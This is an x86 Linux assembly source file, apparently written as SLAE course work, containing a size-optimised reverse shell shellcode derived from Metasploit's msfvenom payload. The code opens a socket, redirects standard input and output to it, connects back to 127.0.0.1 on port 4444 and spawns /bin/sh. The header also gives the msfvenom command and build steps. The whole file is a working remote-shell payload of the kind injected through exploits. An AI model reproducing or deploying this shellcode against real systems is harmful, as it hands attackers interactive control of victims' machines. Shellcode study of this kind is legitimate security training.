; Executable name       : reverse-shell
; Designed OS           : Linux (32-bit)
; Author                : wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : A linux/x86 reverse shell. Created by analysing msfvenom;
;			  The shellcode generated by msfvenom was 68 bytes, however
;			  using select instructions I was able to get it down to 66
;			  bytes. This was possible by using smaller instructions. I
;			  also got it down by taking a look at abatchy17's shellcode
;			  his shellcode can be found here: http://github.com/abatchy17.
;			  I was also able to get rid of a NULL when debugging, the way
;			  this was accomplished by PUSH-ing the absolute necessary only.
;			  This works with 127.0.0.1 by pushing only a word vs a double
;			  word! Hense if we used 127.0.0.1 technically 65 bytes. But
;			  since we wont be doing that 66 bytes is the final result.
;
; Original Metasploit Shellcode
;	sudo msfvenom -p linux/x86/shell_reverse_tcp -b "\x00" LHOST=127.0.0.1 LPORT=4444
;	-f c --smallest -i 0
;
; Build using these commands
;	make
;	./objdump2shellcode.py -d reverse-shell -f c -b "\x00"
;

SECTION .text

global _start

_start:
	; int socketcall(int call, unsigned long *args)
	; int socket (2, 1, 0)
	push 102		; syscall for socketcall() 102
	pop eax			; POP the syscall into EAX
	cdq			; this saves us space
	push ebx		; int socket(
	inc ebx			; 	protocol = 0 = IPPROTO_IP
	push ebx		; 	type	 = 1 = SOCK_STREAM
	push 2			; 	domain	 = 2 = AF_INET
	mov ecx,esp		; (ESP) top of stack contains our args
	int 80h			; call that kernel!!!

	xchg eax,ebx		; place socket descriptor in EBX and 1 into EAX
	pop ecx			; POP 2 into ECX this will be the loop counter

loop:
	; int dup2(int sockfd, int newfd)
	; int dup2(sockfd, 2)
	; int dup2(sockfd, 1)
	; int dup2(sockfd, 0)
	mov al,63		; syscall for dup2()
	int 80h			; call the kernel
	dec ecx			; decrement ECX by 1
	jns loop		; if SF not set, ECX not negative so loop

connect:
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; int connect(sockfd, struct 0xaddress, 16)
	push dword 0x107f	; PUSH 0x100007f (127.0.0.1) note this will contain
				; nulls the work-around if you must use 127.0.0.1 is
				; to PUSH a word not a double word ;)

	push word 0x5c11	; PUSH 0x5c11 (4444)
	push word 2		; PUSH 2 = sin_family = AF_INET
	mov ecx,esp		; save the pointer to struct
	mov al,102		; syscall for socketcall() is 102
	push 66			; PUSH addrlen = 66
	push ecx		; PUSH the struct address
	push ebx		; PUSH sockfd onto stack
	mov ecx,esp		; MOV top of the (ESP) stack into ECX
	int 80h			; call the kernel!!!
shell:
	; int execve(const char *filename, char *const argv[], char *const envp[])
	; int execve()
	push edx		; PUSH some nulls
	push dword 0x68732f2f	; PUSH hs// onto stack
	push dword 0x6e69622f	; PUSH nib/ onto stack
	mov ebx,esp		; put the address of "/bin//sh" into EBX via ESP
	push edx		; PUSH nulls for string termination
	mov ecx,esp		; store argv array into ECX via the stack or ESP
	mov al,0xb		; make execve() syscall or 11
	int 80h			; call the kernel!!!
